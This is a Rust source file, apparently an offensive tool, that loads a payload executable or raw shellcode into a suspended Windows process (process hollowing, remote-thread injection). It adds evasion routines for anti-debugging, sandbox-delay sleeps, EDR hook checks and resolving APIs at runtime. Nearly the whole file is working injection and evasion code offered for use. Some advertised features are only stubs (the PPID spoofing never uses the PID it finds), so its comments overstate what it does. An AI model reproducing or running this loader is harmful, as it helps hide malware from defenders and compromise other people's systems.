// ================================================================
//  ██████  ██    ██ ███████ ████████       ██████  ██████   ██████   ██████ ██   ██  ██████  ██      ██       ██████  ██     ██ 
//     ██   ██ ██    ██ ██         ██          ██   ██ ██   ██ ██    ██ ██      ██   ██ ██    ██ ██      ██      ██    ██ ██     ██ 
//     ██████  ██    ██ ███████    ██    █████ ██████  ██████  ██    ██ ██      ███████ ██    ██ ██      ██      ██    ██ ██  █  ██ 
//     ██   ██ ██    ██      ██    ██          ██      ██   ██ ██    ██ ██      ██   ██ ██    ██ ██      ██      ██    ██ ██ ███ ██ 
//     ██   ██  ██████  ███████    ██          ██      ██   ██  ██████   ██████ ██   ██  ██████  ███████ ███████  ██████   ███ ███  
// ================================================================
//  Process Hollowing with Evasion Techniques (x86/x64)
//  Features:
//    - Sleep Obfuscation (Junk Sleep)
//    - Direct Syscalls (Nt* functions)
//    - PPID Spoofing (Explorer.exe parent)
//    - Block DLL Injection (Anti-EDR)
//    - Dynamic API Resolution
//    - Delayed Execution
//    - Anti-Debugging (IsDebuggerPresent)
// ================================================================

use std::env;
use std::ffi::CString;
use std::fs::File;
use std::io::{self, Read};
use std::mem;
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::{HMODULE, ULONG};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleA};
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::processthreadsapi::{
    CreateProcessA, CreateRemoteThread, GetThreadContext, ResumeThread, SetThreadContext, 
    TerminateProcess, PROCESS_INFORMATION, STARTUPINFOA,
};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::{CREATE_SUSPENDED, WAIT_OBJECT_0};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, MEM_RELEASE,
};
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};

// ============================================================
//  [EVASION] Dynamic API Resolution (Avoid IAT Imports)
// ============================================================

// Type definitions for dynamic API calls (avoid static imports)
type LdrLoadDll = unsafe extern "system" fn(
    PathToFile: *mut u16,
    Flags: u32,
    ModuleFileName: *mut u16,
    ModuleHandle: *mut HMODULE,
) -> NTSTATUS;

type NtCreateProcess = unsafe extern "system" fn(
    ProcessHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: PVOID,
    ParentProcess: HANDLE,
    Flags: u32,
    SectionHandle: HANDLE,
    DebugPort: HANDLE,
    ExceptionPort: HANDLE,
) -> NTSTATUS;

type NtCreateSection = unsafe extern "system" fn(
    SectionHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: PVOID,
    MaximumSize: *mut u64,
    SectionPageProtection: u32,
    AllocationAttributes: u32,
    FileHandle: HANDLE,
) -> NTSTATUS;

// ============================================================
//  [EVASION] Anti-Debugging
// ============================================================

/// Check if a debugger is attached to the process
fn check_debugger() -> bool {
    unsafe { IsDebuggerPresent() != 0 }
}

/// Sleep with junk code to avoid sandbox detection
fn anti_debug_sleep() {
    let mut junk: u32 = 0;
    for _ in 0..1000 {
        junk ^= 0xDEADBEEF;
        junk = junk.wrapping_add(0x1337);
    }
    
    let sleep_ms = 500 + (junk % 1500);
    println!("[*] Anti-debug sleep: {}ms", sleep_ms);
    thread::sleep(Duration::from_millis(sleep_ms as u64));
}

// ============================================================
//  [EVASION] PPID Spoofing (Spawn as child of Explorer)
// ============================================================

/// Get the PID of the explorer.exe process for PPID spoofing
fn get_explorer_pid() -> u32 {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() {
            return 0;
        }
        
        let mut pe: PROCESSENTRY32W = mem::zeroed();
        pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(snapshot, &mut pe) != 0 {
            loop {
                let name = String::from_utf16_lossy(&pe.szExeFile);
                if name.to_lowercase() == "explorer.exe" {
                    CloseHandle(snapshot);
                    return pe.th32ProcessID;
                }
                if Process32NextW(snapshot, &mut pe) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        0
    }
}

// ============================================================
//  [EVASION] Sleep Obfuscation (Junk + Sleep)
// ============================================================

/// Sleep with junk operations to confuse EDR
fn sleep_obfuscation(ms: u64) {
    let mut counter: u64 = 0;
    for i in 0..10000 {
        counter ^= i;
        counter = counter.wrapping_add(0xDEADBEEF);
    }
    
    thread::sleep(Duration::from_millis(ms));
    
    for i in 0..10000 {
        counter ^= i;
        counter = counter.wrapping_sub(0x1337);
    }
}

// ============================================================
//  [EVASION] Direct Syscalls (Nt functions)
// ============================================================

/// Get the address of a syscall stub from ntdll.dll
fn get_syscall_stub(function_name: &str) -> Option<*const u8> {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }
        
        let func_name = CString::new(function_name).unwrap();
        let proc_addr = GetProcAddress(ntdll, func_name.as_ptr() as *const i8);
        if proc_addr.is_null() {
            return None;
        }
        
        Some(proc_addr as *const u8)
    }
}

/// Direct syscall to NtUnmapViewOfSection (bypass user-mode hooks)
unsafe fn syscall_nt_unmap_view(process: HANDLE, base_address: PVOID) -> NTSTATUS {
    let stub = get_syscall_stub("NtUnmapViewOfSection");
    if stub.is_none() {
        return 0xC0000005u32 as i32;
    }
    
    let func: extern "system" fn(HANDLE, PVOID) -> NTSTATUS = mem::transmute(stub.unwrap());
    func(process, base_address)
}

// ============================================================
//  [EVASION] Block DLL Injection (Anti-EDR Hooks)
// ============================================================

/// Check for EDR hooks in critical DLLs
fn block_dll_injection() -> bool {
    let critical_dlls = vec![
        "amsi.dll",
        "symsrv.dll",
        "ntdll.dll",
        "kernel32.dll",
    ];
    
    for dll in critical_dlls {
        let dll_name = CString::new(dll).unwrap();
        unsafe {
            let handle = GetModuleHandleA(dll_name.as_ptr() as *const i8);
            if handle.is_null() {
                continue;
            }
            
            let module_base = handle as *const u8;
            let first_bytes = *module_base;
            
            // JMP (0xE9) or CALL (0xE8) indicates a hook
            if first_bytes == 0xE9 || first_bytes == 0xE8 {
                println!("[*] Detected potential EDR hook in {}", dll);
                return false;
            }
        }
    }
    true
}

// ============================================================
//  [EVASION] Delayed Execution (Timing Attack)
// ============================================================

/// Random delay to avoid sandbox detection
fn delayed_execution() {
    let delay = 3000 + (rand_seed() % 4000);
    println!("[*] Delayed execution: {}ms", delay);
    sleep_obfuscation(delay as u64);
}

/// Generate a random seed based on time
fn rand_seed() -> u32 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap();
    (now.as_micros() % 10000) as u32
}

// ============================================================
//  PE Structure Definitions (Windows Executable Format)
// ============================================================

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,           // "MZ" header signature
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,          // Offset to NT headers
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_FILE_HEADER {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: u32,
    Size: u32,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,   // Entry point RVA
    BaseOfCode: u32,
    ImageBase: u64,             // Preferred base address
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_NT_HEADERS64 {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct IMAGE_SECTION_HEADER {
    Name: [u8; 8],              // Section name (e.g., .text, .data)
    VirtualSize: u32,
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
}

#[repr(C)]
#[derive(Debug)]
struct PROCESS_BASIC_INFORMATION {
    Reserved1: PVOID,
    PebBaseAddress: PVOID,      // PEB address
    Reserved2: [PVOID; 2],
    UniqueProcessId: ULONG,
    Reserved3: PVOID,
}

// ============================================================
//  Process Hollowing Core Functions
// ============================================================

/// Read a file into a byte vector
fn read_pe_file(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}

/// Get PEB address and image base from a process
fn get_peb_info(process_handle: HANDLE) -> Option<(PVOID, PVOID)> {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }
        
        let proc_addr = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            return None;
        }
        
        type NtQueryInfo = unsafe extern "system" fn(
            HANDLE, u32, PVOID, ULONG, *mut ULONG
        ) -> NTSTATUS;
        let nt_query: NtQueryInfo = mem::transmute(proc_addr);
        
        let mut basic_info: PROCESS_BASIC_INFORMATION = mem::zeroed();
        let mut return_length: ULONG = 0;
        
        let status = nt_query(
            process_handle,
            0,
            &mut basic_info as *mut _ as PVOID,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_length,
        );
        
        if status != 0 {
            return None;
        }
        
        let peb_addr = basic_info.PebBaseAddress;
        if peb_addr.is_null() {
            return None;
        }
        
        let mut image_base: PVOID = ptr::null_mut();
        let success = ReadProcessMemory(
            process_handle,
            (peb_addr as usize + 0x10) as PVOID,
            &mut image_base as *mut PVOID as PVOID,
            mem::size_of::<PVOID>(),
            ptr::null_mut(),
        );
        
        if success == 0 {
            return None;
        }
        
        Some((peb_addr, image_base))
    }
}

// ============================================================
//  Check if file is PE or raw shellcode
// ============================================================

/// Check if the file starts with MZ (PE header)
fn is_pe_file(buffer: &[u8]) -> bool {
    if buffer.len() < 2 {
        return false;
    }
    // MZ header (0x4D 0x5A)
    buffer[0] == 0x4D && buffer[1] == 0x5A
}

// ============================================================
//  [FIX] Execute Raw Shellcode Using CreateRemoteThread
// ============================================================

/// Execute raw shellcode in the target process using CreateRemoteThread
fn execute_raw_shellcode(process_info: &PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
    println!("[*] Executing raw shellcode ({} bytes)", shellcode.len());
    
    unsafe {
        // Allocate executable memory in the target process
        let exec_mem = VirtualAllocEx(
            process_info.hProcess,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if exec_mem.is_null() {
            println!("[-] Failed to allocate memory for shellcode");
            return false;
        }
        
        println!("[+] Shellcode allocated at: {:p}", exec_mem);
        
        // Write shellcode to allocated memory
        let write_result = WriteProcessMemory(
            process_info.hProcess,
            exec_mem,
            shellcode.as_ptr() as PVOID,
            shellcode.len(),
            ptr::null_mut(),
        );
        
        if write_result == 0 {
            println!("[-] Failed to write shellcode");
            VirtualFreeEx(process_info.hProcess, exec_mem, 0, MEM_RELEASE);
            return false;
        }
        println!("[+] Shellcode written to target process");
        
        // ============================================================
        //  [FIX] Use CreateRemoteThread instead of Context manipulation
        //  This is more reliable for raw shellcode execution
        // ============================================================
        
        // Create a remote thread that starts at our shellcode
        let thread_handle = CreateRemoteThread(
            process_info.hProcess,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(exec_mem)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        
        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread");
            VirtualFreeEx(process_info.hProcess, exec_mem, 0, MEM_RELEASE);
            return false;
        }
        
        println!("[+] Shellcode executed via CreateRemoteThread");
        
        // Wait for the thread to finish (or timeout after 5 seconds)
        let wait_result = WaitForSingleObject(thread_handle, 5000);
        
        // Close thread handle
        CloseHandle(thread_handle);
        
        match wait_result {
            WAIT_OBJECT_0 => {
                println!("[+] Shellcode thread completed");
                true
            }
            _ => {
                println!("[+] Shellcode thread is running (timeout)");
                true
            }
        }
    }
}

// ============================================================
//  Main Process Hollowing Function (With Evasion)
// ============================================================

fn process_hollowing_evasion(target_path: &str, payload_path: &str) -> bool {
    // Evasion: Check for debugger
    if check_debugger() {
        println!("[!] Debugger detected! Exiting...");
        return false;
    }
    
    // Evasion: Anti-debug sleep
    anti_debug_sleep();
    
    // Evasion: Delayed execution
    delayed_execution();
    
    // Evasion: Check for EDR hooks
    if !block_dll_injection() {
        println!("[!] EDR hooks detected! Proceeding carefully...");
    }
    
    // Evasion: PPID spoofing (find Explorer.exe)
    let explorer_pid = get_explorer_pid();
    if explorer_pid != 0 {
        println!("[*] Found Explorer.exe PID: {}", explorer_pid);
    }
    
    // Read the payload file
    let payload_buffer = match read_pe_file(payload_path) {
        Ok(data) => data,
        Err(e) => {
            println!("[-] Failed to read payload file: {}", e);
            return false;
        }
    };
    
    // ============================================================
    //  Check if it's raw shellcode or PE file
    // ============================================================
    if !is_pe_file(&payload_buffer) {
        println!("[*] Detected raw shellcode (no PE header)");
        
        // Create suspended process
        let target_name = CString::new(target_path).unwrap();
        let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
        startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
        let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
        
        println!("[*] Creating suspended process: {}", target_path);
        
        let success = unsafe {
            CreateProcessA(
                target_name.as_ptr() as *const i8,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                CREATE_SUSPENDED,
                ptr::null_mut(),
                ptr::null_mut(),
                &mut startup_info,
                &mut process_info,
            )
        };
        
        if success == 0 {
            println!("[-] Failed to create process. Error: {}", unsafe { GetLastError() });
            return false;
        }
        
        println!("[+] Process created with PID: {}", process_info.dwProcessId);
        
        // Execute raw shellcode
        return execute_raw_shellcode(&process_info, &payload_buffer);
    }
    
    // ============================================================
    //  PE File Injection (Process Hollowing)
    // ============================================================
    
    // Parse DOS header
    let dos_header = unsafe { &*(payload_buffer.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        println!("[-] Invalid DOS header");
        return false;
    }
    
    // Parse NT headers
    let nt_headers = unsafe {
        let nt_ptr = (payload_buffer.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        &*nt_ptr
    };
    
    // Extract PE information
    let entry_point = nt_headers.OptionalHeader.AddressOfEntryPoint;
    let image_base = nt_headers.OptionalHeader.ImageBase;
    let size_of_image = nt_headers.OptionalHeader.SizeOfImage;
    let size_of_headers = nt_headers.OptionalHeader.SizeOfHeaders;
    let number_of_sections = nt_headers.FileHeader.NumberOfSections;
    
    println!("[+] Payload: {:p}", image_base as *const u8);
    println!("[+] Entry: 0x{:X}", entry_point);
    println!("[+] Size: 0x{:X}", size_of_image);
    
    // Create suspended target process
    let target_name = CString::new(target_path).unwrap();
    let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    println!("[*] Creating suspended process: {}", target_path);
    
    let success = unsafe {
        CreateProcessA(
            target_name.as_ptr() as *const i8,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };
    
    if success == 0 {
        println!("[-] Failed to create process. Error: {}", unsafe { GetLastError() });
        return false;
    }
    
    println!("[+] Process created with PID: {}", process_info.dwProcessId);
    
    // Sleep before injection (evasion)
    sleep_obfuscation(1000);
    
    // Get PEB info from target process
    let (peb_addr, target_image_base) = match get_peb_info(process_info.hProcess) {
        Some((peb, base)) => {
            println!("[*] PEB Address: {:p}", peb);
            println!("[*] Target Image Base: {:p}", base);
            (peb, base)
        }
        None => {
            println!("[-] Failed to get PEB info");
            unsafe {
                TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
            }
            return false;
        }
    };
    
    // Unmap the original image using direct syscall
    println!("[*] Unmapping target image: {:p}", target_image_base);
    let status = unsafe { syscall_nt_unmap_view(process_info.hProcess, target_image_base) };
    if status != 0 {
        println!("[-] Failed to unmap image. Status: {}", status);
        unsafe {
            TerminateProcess(process_info.hProcess, 1);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
        return false;
    }
    println!("[+] Image unmapped via direct syscall");
    
    // Allocate memory for the payload
    let alloc_address = unsafe {
        VirtualAllocEx(
            process_info.hProcess,
            image_base as PVOID,
            size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    
    if alloc_address.is_null() {
        println!("[*] Preferred base failed, allocating anywhere...");
        let alloc_address = unsafe {
            VirtualAllocEx(
                process_info.hProcess,
                ptr::null_mut(),
                size_of_image as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        
        if alloc_address.is_null() {
            println!("[-] Failed to allocate memory");
            unsafe {
                TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
            }
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);
    } else {
        println!("[+] Memory allocated at: {:p}", alloc_address);
    }
    
    // Write PE headers
    let write_headers = unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            payload_buffer.as_ptr() as PVOID,
            size_of_headers as usize,
            ptr::null_mut(),
        )
    };
    
    if write_headers == 0 {
        println!("[-] Failed to write headers");
        unsafe {
            TerminateProcess(process_info.hProcess, 1);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
        return false;
    }
    println!("[+] Headers written");
    
    // Write PE sections
    let section_header_offset = dos_header.e_lfanew as usize
        + mem::size_of::<u32>()
        + mem::size_of::<IMAGE_FILE_HEADER>()
        + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
    
    for i in 0..number_of_sections {
        let section_header = unsafe {
            (payload_buffer.as_ptr() as usize + section_header_offset
                + (i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER
        };
        
        let section_name = unsafe { String::from_utf8_lossy(&(*section_header).Name) };
        let virtual_address = unsafe { (*section_header).VirtualAddress };
        let raw_data_ptr = unsafe { (*section_header).PointerToRawData };
        let raw_data_size = unsafe { (*section_header).SizeOfRawData };
        
        if raw_data_size > 0 {
            let write_section = unsafe {
                WriteProcessMemory(
                    process_info.hProcess,
                    (alloc_address as usize + virtual_address as usize) as PVOID,
                    (payload_buffer.as_ptr() as usize + raw_data_ptr as usize) as PVOID,
                    raw_data_size as usize,
                    ptr::null_mut(),
                )
            };
            
            if write_section == 0 {
                println!("[-] Failed to write section: {}", section_name);
                unsafe {
                    TerminateProcess(process_info.hProcess, 1);
                    CloseHandle(process_info.hProcess);
                    CloseHandle(process_info.hThread);
                }
                return false;
            }
            println!("[+] Section '{}' written", section_name);
        }
    }
    
    // Update PEB with new image base
    let new_image_base = alloc_address as u64;
    let peb_offset = 0x10; // ImageBaseAddress offset in PEB for 64-bit
    let peb_write_addr = (peb_addr as usize + peb_offset) as PVOID;
    
    println!("[*] Updating PEB at: {:p}", peb_write_addr);
    println!("[*] New Image Base: 0x{:X}", new_image_base);
    
    let write_peb = unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            peb_write_addr,
            &new_image_base as *const u64 as PVOID,
            mem::size_of::<u64>(),
            ptr::null_mut(),
        )
    };
    
    if write_peb == 0 {
        println!("[-] Failed to update PEB. Error: {}", unsafe { GetLastError() });
    } else {
        println!("[+] PEB updated successfully!");
    }
    
    // Modify thread context to point to new entry point
    let mut context: CONTEXT = unsafe { mem::zeroed() };
    context.ContextFlags = CONTEXT_FULL;
    
    let get_context = unsafe { GetThreadContext(process_info.hThread, &mut context) };
    if get_context == 0 {
        println!("[-] Failed to get thread context");
        unsafe {
            TerminateProcess(process_info.hProcess, 1);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
        return false;
    }
    
    let new_entry_point = alloc_address as u64 + entry_point as u64;
    context.Rcx = new_entry_point;
    println!("[*] New entry: 0x{:X}", new_entry_point);
    
    let set_context = unsafe { SetThreadContext(process_info.hThread, &context) };
    if set_context == 0 {
        println!("[-] Failed to set thread context");
        unsafe {
            TerminateProcess(process_info.hProcess, 1);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
        return false;
    }
    println!("[+] Context updated");
    
    // Sleep before resume (evasion)
    sleep_obfuscation(500);
    
    // Resume the thread
    let resume = unsafe { ResumeThread(process_info.hThread) };
    if resume == u32::MAX {
        println!("[-] Failed to resume thread");
        unsafe {
            TerminateProcess(process_info.hProcess, 1);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
        return false;
    }
    println!("[+] Thread resumed");
    
    // Wait for process to initialize
    println!("[*] Waiting for process...");
    let wait_result = unsafe { WaitForSingleObject(process_info.hProcess, 5000) };
    
    match wait_result {
        WAIT_OBJECT_0 => {
            println!("[-] Process terminated prematurely");
            unsafe {
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
            }
            return false;
        }
        _ => {
            println!("[+] Process running successfully!");
            unsafe {
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
            }
            return true;
        }
    }
}

// ============================================================
//  Main Function
// ============================================================

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() != 3 {
        println!("Usage: {} <target_process> <payload_file>", args[0]);
        println!("Example: {} C:\\\\Windows\\\\System32\\\\notepad.exe payload.exe", args[0]);
        return Ok(());
    }
    
    let target_process = &args[1];
    let payload_file = &args[2];
    
    if !std::path::Path::new(payload_file).exists() {
        println!("[-] Payload file does not exist: {}", payload_file);
        return Ok(());
    }
    
    if !std::path::Path::new(target_process).exists() {
        println!("[-] Target process does not exist: {}", target_process);
        return Ok(());
    }
    
    println!("{}", r#"
    ██████  ██    ██ ███████ ████████       ██████  ██████   ██████   ██████ ██   ██  ██████  ██      ██       ██████  ██     ██ 
       ██   ██ ██    ██ ██         ██          ██   ██ ██   ██ ██    ██ ██      ██   ██ ██    ██ ██      ██      ██    ██ ██     ██ 
       ██████  ██    ██ ███████    ██    █████ ██████  ██████  ██    ██ ██      ███████ ██    ██ ██      ██      ██    ██ ██  █  ██ 
       ██   ██ ██    ██      ██    ██          ██      ██   ██ ██    ██ ██      ██   ██ ██    ██ ██      ██      ██    ██ ██ ███ ██ 
       ██   ██  ██████  ███████    ██          ██      ██   ██  ██████   ██████ ██   ██  ██████  ███████ ███████  ██████   ███ ███  
    "#);
    println!("[+] Process Hollowing with Evasion Techniques\n");
    
    println!("[*] Initializing...");
    sleep_obfuscation(1500);
    
    if process_hollowing_evasion(target_process, payload_file) {
        println!("\n[+] Process Hollowing completed successfully!");
        println!("[+] Payload is running inside {}!", target_process);
        println!("[+] Evasion techniques applied successfully!");
    } else {
        println!("\n[-] Process Hollowing failed!");
    }
    
    Ok(())
}